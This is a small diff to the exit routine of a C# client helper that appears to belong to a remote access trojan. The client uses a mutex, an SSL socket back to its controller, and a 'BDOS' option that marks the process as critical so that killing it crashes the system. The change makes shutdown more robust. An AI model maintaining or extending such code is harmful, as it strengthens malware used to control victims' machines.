@@ -1,6 +1,7 @@
 ﻿using Client.Sockets;
 using System;
 using System.IO;
+using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
@@ -54,11 +55,16 @@ namespace Client.Helper
         }
         public static void ClientExit()
         {
+            try
+            {
                 if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                     ProcessCritical.Exit();
-            CloseMutex();
-            ClientSocket.SslClient?.Close();
-            ClientSocket.Client?.Close();
+                CloseMutex();
+                ClientSocket.Client?.Shutdown(SocketShutdown.Both);
+                ClientSocket.SslClient?.Close();
+                ClientSocket.Client?.Close();
+            }
+            catch { }
         }
     }
 }
